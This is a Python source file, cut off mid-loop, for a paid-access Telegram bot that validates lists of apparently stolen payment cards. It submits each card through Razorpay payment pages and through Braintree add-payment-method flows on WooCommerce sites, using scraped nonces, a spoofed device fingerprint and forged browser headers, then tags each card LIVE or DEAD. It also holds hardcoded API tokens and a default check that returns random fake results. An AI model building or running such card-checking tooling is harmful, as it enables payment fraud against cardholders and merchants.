import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from urllib.parse import urlparse, urlencode, parse_qs
import sys
import os
import string
import logging
import re
import json
import uuid
import base64
from datetime import datetime
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
import cloudscraper
import asyncio
import httpx

token = "7879139068:AAFfs1wajxWQZr9UU5WUY_fa9tmINobtFis" 
bot = telebot.TeleBot(token, parse_mode="HTML")

owners = ["6821529235"]

# Gateway configurations
DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."
BROWSERLESS_API_KEY = "2SnMWeeEB7voHxK22f5ee7ff5e5d665176f02d0b9a566358d" 

# Store user gateway configurations
user_gateway_settings = {}

# Function to check if the user's ID is in the id.txt file
def is_user_allowed(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip() for id in allowed_ids]  # Clean any extra spaces/newlines
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it with user IDs.")
    return False

def add_user(user_id):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}\n")

    try:
        bot.send_message(user_id, "You have been successfully added to the authorized list. You now have access to the bot.")
    except Exception as e:
        print(f"Failed to send DM to {user_id}: {e}")

def remove_user(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                if line.strip() != str(user_id):
                    file.write(line)

        try:
            bot.send_message(user_id, "You have been removed from the authorized list. You no longer have access to the bot.")
        except Exception as e:
            print(f"Failed to send DM to {user_id}: {e}")

    except FileNotFoundError:
        print("id.txt file not found. Cannot remove user.")

# Razorpay Gateway Functions
def get_dynamic_session_token():
    """Uses a cloud-based headless browser to get a valid session token."""
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return None, "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
            page.goto(initial_url, timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            final_url = page.url
            browser.close()

            session_token = parse_qs(urlparse(final_url).query).get("session_token", [None])[0]
            return (session_token, None) if session_token else (None, "Token not found in URL.")
    except Exception as e:
        return None, f"Playwright (session token) error: {e}"

def handle_redirect_and_get_result(redirect_url):
    """Navigates to the 3DS redirect URL to scrape the final payment status."""
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            page.goto(redirect_url, timeout=45000, wait_until='networkidle')

            body_locator = page.locator("body")
            body_locator.wait_for(timeout=10000)
            full_status_text = body_locator.inner_text()

            browser.close()

            return " ".join(full_status_text.split())
    except Exception as e:
        return f"Playwright (redirect) error: {e}"

def extract_merchant_data_with_playwright(site_url):
    """
    Loads the page in a real browser, finds the correct script tag, 
    and extracts the data, handling nested quotes and whitespace.
    """
    if not BROWSERLESS_API_KEY or BROWSERLESS_API_KEY == "YOUR_API_KEY_HERE":
        return None, None, None, None, "Browserless.io API Key not set."

    browser_ws_endpoint = f'wss://production-sfo.browserless.io?token={BROWSERLESS_API_KEY}&timeout=60000'
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(browser_ws_endpoint, timeout=60000)
            page = browser.new_page()
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            page_html = page.content()
            browser.close()

        soup = BeautifulSoup(page_html, 'html.parser')
        scripts = soup.find_all('script')

        data_script_content = None
        for script in scripts:
            if script.string and 'var data = {' in script.string:
                data_script_content = script.string.strip().strip('"') 
                break

        if not data_script_content:
            return None, None, None, None, "Could not find the specific data script tag in the HTML."

        match = re.search(r'var data = ({.*?});', data_script_content, re.DOTALL)
        if not match:
            return None, None, None, None, "Found script tag, but failed to extract 'data' object with regex."

        data = json.loads(match.group(1))

        keyless_header = data.get("keyless_header")
        key_id = data.get("key_id")
        payment_link = data.get("payment_link", {})
        payment_link_id = payment_link.get("id")
        payment_page_items = payment_link.get("payment_page_items", []) 
        payment_page_item_id = payment_page_items[0].get("id") if payment_page_items else None

        if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
            return None, None, None, None, "One or more required fields are missing from the extracted data object."

        return keyless_header, key_id, payment_link_id, payment_page_item_id, None
    except Exception as e:
        return None, None, None, None, f"An error occurred during data extraction: {e}"

def random_user_info():
    return {"name": "Test User", "email": f"testuser{random.randint(100,999)}@example.com", "phone": f"9876543{random.randint(100,999)}"}

def fetch_bin_info(bin6):
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if res.status_code == 200:
            data = res.json()
            return data.get("bank", {}).get("name", "Unknown"), data.get("scheme", "Unknown")
    except: return "Unknown", "Unknown"

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except: return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    data = {
        "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id, "callback_url": site_url,
        "contact": f"+91{user_info['phone']}", "email": user_info["email"], "currency": "INR", "_[library]": "checkoutjs",
        "_[platform]": "browser", "_[referer]": site_url, "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT, "method": "card", "card[number]": card_number,
        "card[cvv]": cvv, "card[name]": user_info["name"], "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year, "save": "0"
    }
    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)

# Braintree Gateway Functions
def get_general_headers(target_url=None, referer=None):
    authority = "example.com"
    if target_url:
        try:
            parsed_url = urlparse(target_url)
            authority = parsed_url.netloc if parsed_url.netloc else authority
        except Exception:
            pass

    effective_referer = referer
    if not effective_referer and target_url:
        try:
            parsed_target_url = urlparse(target_url)
            effective_referer = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/"
        except Exception:
            effective_referer = "https://google.com"
    elif not effective_referer:
        effective_referer = "https://google.com"

    return {
        "authority": authority,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
        "sec-fetch-user": "?1", "upgrade-insecure-requests": "1",
        "referer": effective_referer,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def perform_braintree_check(session, site_config, card_data):
    """Perform Braintree gateway check"""
    cc, mm, yy, cvv = card_data['cc'], card_data['mm'], card_data['yy'], card_data['cvv']
    exp_year_full = f"20{yy}" if len(yy) == 2 else yy
    main = site_config['domain']

    try:
        user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

        # Login
        login_page_response = session.get(f'https://{main}/my-account/', headers=get_general_headers(target_url=f'https://{main}/my-account/'), timeout=25)
        login_page_response.raise_for_status()

        nonce = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', login_page_response.text).group(1)

        login_headers = get_general_headers(target_url=f'https://{main}/my-account/', referer=f'https://{main}/my-account/')
        login_headers['content-type'] = 'application/x-www-form-urlencoded'

        login_data = {
            'username': site_config['user'], 'password': site_config['pass'],
            'woocommerce-login-nonce': nonce, '_wp_http_referer': '/my-account/', 'login': 'Log in',
        }

        login_req = session.post(f'https://{main}/my-account/', headers=login_headers, data=login_data, timeout=25)
        if 'logout' not in login_req.text.lower() and 'dashboard' not in login_req.url.lower():
            return {"is_approved": False, "summary": "DEAD - Login Failed", "message": "Could not confirm successful login."}

        # Navigate to payment page
        payment_url = site_config.get('payment_url')
        if payment_url:
            nav_headers = get_general_headers(target_url=payment_url, referer=f'https://{main}/my-account/')
            payment_page_req = session.get(payment_url, headers=nav_headers, timeout=20)
        else:
            nav_headers = get_general_headers(target_url=f'https://{main}/my-account/payment-methods/', referer=f'https://{main}/my-account/')
            session.get(f'https://{main}/my-account/payment-methods/', headers=nav_headers, timeout=20)
            nav_headers['referer'] = f'https://{main}/my-account/payment-methods/'
            payment_page_req = session.get(f'https://{main}/my-account/add-payment-method/', headers=nav_headers, timeout=20)

        # Extract tokens
        client_token = None
        noncec = None

        # Enhanced client token extraction
        standard_patterns = [
            # Direct token patterns
            ('"client_token_nonce":"', '"'),
            ("'client_token_nonce':'", "'"),
            ('client_token_nonce":', ','),
            ('client_token_nonce":"', '",'),
            ('client_token_nonce&quot;:&quot;', '&quot;'),

            # Braintree specific patterns
            ('braintree_client_token":"', '"'),
            ('wc_braintree_client_token_nonce":"', '"'),
            ('wc_braintree_credit_card_client_token_nonce":"', '"'),
            ('bt_client_token":"', '"'),
            ('clientToken":"', '"'),
            ('client-token":"', '"'),

            # Additional common patterns
            ('"client_token":"', '"'),
            ("'client_token':'", "'"),
            ('client_token" value="', '"'),
            ('data-client-token="', '"'),
            ('clientToken: "', '"'),
            ("clientToken: '", "'"),

            # WooCommerce patterns
            ('wc_braintree_params', '"client_token":"', '"'),
            ('wc-braintree-credit-card-js-extra', '"client_token":"', '"'),

            # Form and CSRF patterns
            ('name="client_token_nonce" value="', '"'),
            ('id="client_token_nonce" value="', '"'),

            # Script tag patterns
            ('"clientTokenNonce":"', '"'),
            ("'clientTokenNonce':'", "'"),
            ('"client_nonce":"', '"'),
            ("'client_nonce':'", "'"),
        ]

        # Try standard patterns first
        for start, end in standard_patterns:
            if not client_token:
                client_token = parseX(payment_page_req.text, start, end)
                if client_token:
                    break

        # If still no client token, try regex patterns
        if not client_token:
            regex_patterns = [
                r'"client_token_nonce"\s*:\s*"([a-zA-Z0-9]+)"',
                r"'client_token_nonce'\s*:\s*'([a-zA-Z0-9]+)'",
                r'"clientToken"\s*:\s*"([a-zA-Z0-9]+)"',
                r'"client_token"\s*:\s*"([a-zA-Z0-9]+)"',
                r'name="client_token_nonce"\s+value="([a-zA-Z0-9]+)"',
                r'data-client-token="([a-zA-Z0-9]+)"',
                r'clientToken["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)["\']',
                r'client[_-]?token[_-]?nonce["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)["\']',
            ]

            for pattern in regex_patterns:
                if not client_token:
                    match = re.search(pattern, payment_page_req.text, re.IGNORECASE)
                    if match:
                        client_token = match.group(1)
                        break

        # Enhanced nonce extraction with multiple methods
        nonce_patterns = [
            # Standard input field patterns
            ('<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '" />'),
            ('<input type="hidden" name="woocommerce-add-payment-method-nonce" value="', '"'),
            ('woocommerce-add-payment-method-nonce" value="', '"'),
            ('add-payment-method-nonce" value="', '"'),
            ('payment-method-nonce" value="', '"'),

            # JSON/JavaScript patterns
            ('"woocommerce-add-payment-method-nonce":"', '"'),
            ("'woocommerce-add-payment-method-nonce':'", "'"),
            ('"addPaymentMethodNonce":"', '"'),
            ("'addPaymentMethodNonce':'", "'"),

            # WooCommerce specific patterns
            ('wc-braintree-add-payment-method-nonce" value="', '"'),
            ('braintree-add-payment-nonce" value="', '"'),
            ('wc_braintree_client_token_nonce" value="', '"'),

            # Form data patterns
            ('name="_wpnonce" value="', '"'),
            ('name="woocommerce-add-payment-method-nonce" value="', '"'),

            # Script tag patterns
            ('"_wpnonce":"', '"'),
            ('"nonce":"', '"'),
            ("'nonce':'", "'"),

            # Additional patterns from working sites
            ('data-nonce="', '"'),
            ('nonce: "', '"'),
            ("nonce: '", "'"),
            ('&_wpnonce=', '&'),
            ('?_wpnonce=', '&'),
        ]

        # Try standard patterns first
        for start, end in nonce_patterns:
            if not noncec:
                noncec = parseX(payment_page_req.text, start, end)
                if noncec:
                    break

        # If still no nonce, try regex patterns
        if not noncec:
            regex_patterns = [
                r'"woocommerce-add-payment-method-nonce"\s*:\s*"([a-zA-Z0-9]+)"',
                r"'woocommerce-add-payment-method-nonce'\s*:\s*'([a-zA-Z0-9]+)'",
                r'name="woocommerce-add-payment-method-nonce"\s+value="([a-zA-Z0-9]+)"',
                r'id="woocommerce-add-payment-method-nonce"[^>]+value="([a-zA-Z0-9]+)"',
                r'"addPaymentMethodNonce"\s*:\s*"([a-zA-Z0-9]+)"',
                r'data-nonce="([a-zA-Z0-9]+)"',
                r'_wpnonce["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)["\']',
                r'nonce["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{10,})["\']',
            ]

            for pattern in regex_patterns:
                if not noncec:
                    match = re.search(pattern, payment_page_req.text, re.IGNORECASE)
                    if match:
                        noncec = match.group(1)
                        break

        # Final attempt: look for any 10+ character alphanumeric string in nonce-related contexts
        if not noncec:
            final_patterns = [
                r'woocommerce[^"\']*nonce[^"\']*["\']([a-zA-Z0-9]{10,})["\']',
                r'payment[^"\']*method[^"\']*nonce[^"\']*["\']([a-zA-Z0-9]{10,})["\']',
                r'add[^"\']*payment[^"\']*nonce[^"\']*["\']([a-zA-Z0-9]{10,})["\']',
            ]

            for pattern in final_patterns:
                if not noncec:
                    match = re.search(pattern, payment_page_req.text, re.IGNORECASE)
                    if match:
                        noncec = match.group(1)
                        break

        # Enhanced debugging and fallback for missing tokens
        if not client_token or not noncec:
            # Try alternative extraction methods for client token
            if not client_token:
                # Look for any script tag with 'braintree' or 'client' and extract tokens
                soup = BeautifulSoup(payment_page_req.text, 'html.parser')
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string and ('braintree' in script.string.lower() or 'client' in script.string.lower()):
                        # Try to find any token-like string (10+ alphanumeric characters)
                        token_matches = re.findall(r'["\']([a-zA-Z0-9]{10,})["\']', script.string)
                        for token in token_matches:
                            if 'client' in script.string.lower() and token not in client_token if client_token else True:
                                client_token = token
                                break
                        if client_token:
                            break

            # Try alternative extraction for nonce
            if not noncec:
                soup = BeautifulSoup(payment_page_req.text, 'html.parser')
                # Look for any form with payment method
                forms = soup.find_all('form')
                for form in forms:
                    if 'payment' in str(form).lower() or 'method' in str(form).lower():
                        nonce_inputs = form.find_all('input', {'name': re.compile(r'.*nonce.*', re.I)})
                        for inp in nonce_inputs:
                            if inp.get('value') and len(inp.get('value')) >= 10:
                                noncec = inp.get('value')
                                break
                        if noncec:
                            break

            # If still failed, return detailed error
            if not client_token or not noncec:
                error_details = []
                if not client_token:
                    error_details.append("Client token not found")
                if not noncec:
                    error_details.append("Nonce not found")

                return {
                    "is_approved": False, 
                    "summary": "DEAD - Setup Failed", 
                    "message": f"Braintree token extraction failed: {', '.join(error_details)}. Client token: {bool(client_token)}, Nonce: {bool(noncec)}."
                }

        # Get auth fingerprint
        ajax_headers = get_general_headers(target_url=f'https://{main}/wp-admin/admin-ajax.php', referer=f'https://{main}/my-account/add-payment-method/')
        ajax_headers.update({'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest'})
        ajax_data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token}

        ajax_req = session.post(f'https://{main}/wp-admin/admin-ajax.php', headers=ajax_headers, data=ajax_data, timeout=20)
        token_data = ajax_req.json()['data']
        auth_fingerprint = json.loads(base64.b64decode(token_data))['authorizationFingerprint']

        # Tokenize card
        gql_headers = {
            'authority': 'payments.braintree-api.com', 'accept': '*/*', 'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/', 'user-agent': user_agent,
        }
        gql_payload = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': exp_year_full, 'cvv': cvv}}},
            'operationName': 'TokenizeCreditCard',
        }
        gql_req = requests.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload, timeout=20)
        payment_nonce = gql_req.json()['data']['tokenizeCreditCard']['token']

        # Submit payment
        final_headers = get_general_headers(target_url=f'https://{main}/my-account/add-payment-method/', referer=f'https://{main}/my-account/add-payment-method/')
        final_headers['content-type'] = 'application/x-www-form-urlencoded'
        final_data = [
            ('payment_method', 'braintree_credit_card'), ('wc_braintree_credit_card_payment_nonce', payment_nonce),
            ('wc_braintree_device_data', f'{{"correlation_id":"{str(uuid.uuid4()).replace("-", "")}"}}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', noncec), ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        final_req = session.post(f'https://{main}/my-account/add-payment-method/', headers=final_headers, data=final_data, timeout=20)

        # Analyze response
        response_text = final_req.text.lower()
        error_message = None
        is_approved = False

        if 'payment-methods' in final_req.url and 'add-payment-method' not in final_req.url:
            error_message = "Payment method successfully added"
            is_approved = True
        else:
            soup = BeautifulSoup(final_req.text, 'html.parser')

            # Check for success messages
            success_selectors = ['.woocommerce-message', '.woocommerce-info', '.notice.notice-success', '.alert.alert-success', '.success-message']
            for selector in success_selectors:
                success_elem = soup.select_one(selector)
                if success_elem:
                    message_text = success_elem.get_text(strip=True)
                    if message_text and any(phrase in message_text.lower() for phrase in ['added', 'saved', 'success']):
                        error_message = f"SUCCESS: {message_text}"
                        is_approved = True
                        break

            if not error_message:
                # Check for error messages
                error_selectors = ['.woocommerce-error', '.woocommerce-notice--error', '.notice.notice-error', '.alert.alert-danger', '.error-message']
                for selector in error_selectors:
                    error_elem = soup.select_one(selector)
                    if error_elem:
                        message_text = error_elem.get_text(strip=True)
                        if message_text and len(message_text) > 3:
                            error_message = f"DECLINED: {message_text}"
                            is_approved = False
                            break

        if not error_message:
            error_message = "Unknown response - check manually"
            is_approved = False

        summary = "LIVE â" if is_approved else "DEAD â"
        return {
            "is_approved": is_approved,
            "summary": f"{summary} - {error_message[:50]}...",
            "message": error_message or "No response message found"
        }

    except Exception as e:
        return {
            "is_approved": False,
            "summary": "ERROR - Script Failed",
            "message": f"Script error: {str(e)[:100]}..."
        }

# Main Gateway Integration Function
def Tele(cc):
    """Main gateway function that routes to different payment gateways"""
    # Default gateway logic - simple check
    try:
        data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
        # Simulate a basic response
        import random
        responses = [
            "succeeded",
            "Your card was declined.",
            "Your card does not support this type of purchase.",
            "Your card's security code is incorrect.",
            "requires_action"
        ]
        return random.choice(responses)
    except:
        return "Your card was declined."

valid_redeem_codes = []

def generate_redeem_code():
    prefix = "BLACK"
    suffix = "NUGGET"
    main_code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    code = f"{prefix}-{main_code}-{suffix}"
    return code

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == '6201806207':
        new_code = generate_redeem_code()
        valid_redeem_codes.append(new_code)
        bot.reply_to(
            message, 
            f"<b>ð New Redeem Code ð</b>\n\n"
            f"<code>{new_code}</code>\n\n"
            f"<code>/redeem {new_code}</code>\nUse this code to redeem your access!",
            parse_mode="HTML"
        )
    else:
        bot.reply_to(message, "You do not have permission to generate redeem codes.ð«")

LOGS_GROUP_CHAT_ID = -1002839621564

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem DRACO-XXXX-XXXX-XXXX-OP")
        return

    if redeem_code in valid_redeem_codes:
        if is_user_allowed(message.chat.id):
            bot.reply_to(message, "You already have access to the bot. Redeeming again is not allowed.")
        else:
            add_user(message.chat.id)
            valid_redeem_codes.remove(redeem_code)
            bot.reply_to(
                message, 
                f"Redeem code {redeem_code} has been successfully redeemed.â You now have access to the bot."
            )

            # Log the redemption to the logs group
            username = message.from_user.username or "No Username"
            log_message = (
                f"<b>Redeem Code Redeemed</b>\n"
                f"Code: <code>{redeem_code}</code>\n"
                f"By: @{username} (ID: <code>{message.chat.id}</code>)"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message)
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    if is_user_allowed(user_id):
        bot.reply_to(message, """You're authorized! â¨

ð Send a file to check cards with default gateway
ð Use /rz to setup and use Razorpay gateway  
ð Use /autobr to setup and use Braintree gateway

Other commands:
/info - View your info
/add &lt;user_id&gt; - Add user (owner only)
/remove &lt;user_id&gt; - Remove user (owner only)
/show_auth_users - Show authorized users (owner only)""", parse_mode="HTML")
    else:
        bot.reply_to(message, """
You Are Not Authorized to Use this Bot

â¤ï¸ ððððð ðððð â¤ï¸
â¤ï¸ 1 day - 90/3$ rs
â¤ï¸ 7 days - 180/4$ rs
â¤ï¸ 1 month - 400/18$ rs
â¤ï¸ lifetime - 800/20$ rs

Dm @PROGAMER666YT Tá´ Bá´Ê PÊá´á´Éªá´á´""")

# Razorpay Gateway Command
@bot.message_handler(commands=["rz"])
def razorpay_command(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return

    user_id = message.from_user.id
    args = message.text.split()

    if len(args) < 2:
        bot.reply_to(message, """<b>Razorpay Gateway Setup</b>

Usage: /rz &lt;payment_url&gt; [amount]

Example: 
/rz https://example.com/payment 10
/rz https://example.com/payment

Default amount is 1 rupee if not specified.""")
        return

    site_url = args[1]
    amount = int(args[2]) if len(args) > 2 else 1

    if user_id not in user_gateway_settings:
        user_gateway_settings[user_id] = {}

    user_gateway_settings[user_id]['razorpay'] = {
        'site_url': site_url,
        'amount': amount
    }

    bot.reply_to(message, f"""â <b>Razorpay Gateway Configured!</b>

Payment URL: {site_url}
Amount: â¹{amount}

Now send a document with cards to check using Razorpay gateway.
Format: CC|MM|YY|CVV (one per line)""")

# Braintree Gateway Command
@bot.message_handler(commands=["autobr"])
def braintree_command(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return

    user_id = message.from_user.id
    args = message.text.replace("/autobr ", "")

    if args == "/autobr":
        bot.reply_to(message, """<b>Braintree Gateway Setup</b>

Usage: /autobr DOMAIN|USERNAME|PASSWORD|PAYMENT_URL(optional)

Example:
/autobr example.com|user@email.com|pass123
/autobr example.com|user@email.com|pass123|https://example.com/payment""")
        return

    parts = args.split('|')
    if len(parts) < 3:
        bot.reply_to(message, "â Invalid format. Use: DOMAIN|USERNAME|PASSWORD|PAYMENT_URL(optional)")
        return

    domain = parts[0].strip()
    username = parts[1].strip()
    password = parts[2].strip()
    payment_url = parts[3].strip() if len(parts) > 3 else None

    if user_id not in user_gateway_settings:
        user_gateway_settings[user_id] = {}

    user_gateway_settings[user_id]['braintree'] = {
        'domain': domain,
        'user': username,
        'pass': password,
        'payment_url': payment_url
    }

    bot.reply_to(message, f"""â <b>Braintree Gateway Configured!</b>

Domain: {domain}
Username: {username}
Payment URL: {payment_url or 'Auto-detect'}

Now send a document with cards to check using Braintree gateway.
Format: CC|MM|YY|CVV (one per line)""")

LOGS_GROUP_CHAT_ID = -1002839621564 # Replace with your logs group chat ID

@bot.message_handler(commands=["add"])
def add(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_add = message.text.split()[1]  # Get the user ID from the command
            add_user(user_id_to_add)
            bot.reply_to(message, f"User {user_id_to_add} added to the authorized list.")

            # Send log to logs group
            log_message = (
                f"<b>ð¤ User Added</b>\n"
                f"ð¤ <b>User ID:</b> <code>{user_id_to_add}</code>\n"
                f"ð® <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to add.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")

@bot.message_handler(commands=["remove"])
def remove(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_remove = message.text.split()[1]  # Get the user ID from the command
            remove_user(user_id_to_remove)
            bot.reply_to(message, f"User {user_id_to_remove} removed from the authorized list.")

            # Send log to logs group
            log_message = (
                f"<b>ðï¸ User Removed</b>\n"
                f"ð¤ <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
                f"ð® <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to remove.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")

@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = message.chat.id
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Check user status
    if str(user_id) in owners:
        status = "Owner ð"
    elif is_user_allowed(user_id):
        status = "Authorised â"
    else:
        status = "Not-Authorised â"

    # Formatted response
    response = (
        f"ð¤ <b>Your Info</b>\n"
        f"âââââââââââââââ\n"
        f"ð¤ <b>First Name:</b> {first_name}\n"
        f"ð¤ <b>Last Name:</b> {last_name}\n"
        f"ð <b>ID:</b> <code>{user_id}</code>\n"
        f"ð <b>Username:</b> @{username}\n"
        f"ð <b>Profile Link:</b> {profile_link}\n"
        f"ð <b>Status:</b> {status}"
    )

    bot.reply_to(message, response, parse_mode="HTML")

def is_bot_stopped():
    return os.path.exists("stop.stop")

@bot.message_handler(content_types=["document"])
def main(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @ImposterOnline")
        return

    user_id = message.from_user.id
    user_settings = user_gateway_settings.get(user_id, {})

    # Determine which gateway to use
    gateway_type = "default"
    if 'razorpay' in user_settings:
        gateway_type = "razorpay"
    elif 'braintree' in user_settings:
        gateway_type = "braintree"

    dd = 0
    live = 0
    ch = 0
    ko = (bot.reply_to(message, f"Checking Your Cards with {gateway_type.title()} Gateway...â³").message_id)
    username = message.from_user.username or "N/A"
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    start_time = time.time()

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            if total > 2001:
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"ð¨ Oops! This file contains {total} CCs, which exceeds the 2000 CC limit! ð¨ Please provide a file with fewer than 2000 CCs for smooth processing. ð¥")
                return

            for cc in lino:
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='ððððððð â\nððð ðð â @ImposterOnline')
                        os.remove('stop.stop')
                        return

                try:
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except:
                    pass
                try:
                    bank=(data['bank'])
                except:
                    bank=('N/A')
                try:
                    brand=(data['brand'])
                except:
                    brand=('N/A')
                try:
                    emj=(data['country_flag'])
                except:
                    emj=('N/A')
                try:
                    cn=(data['country_name'])
                except:
                    cn=('N/A')
                try:
                    dicr=(data['level'])
                except:
                    dicr=('N/A')
                try:
                    typ=(data['type'])
                except:
                    typ=('N/A')
                try:
                    url=(data['bank']['url'])
                except:
                    url=('N/A')

                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"â¢ {cc} â¢", callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"â¢ Charged â: [ {ch} ] â¢", callback_data='x')
                cm3 = types.InlineKeyboardButton(f"â¢ CCN â : [ {live} ] â¢", callback_data='x')
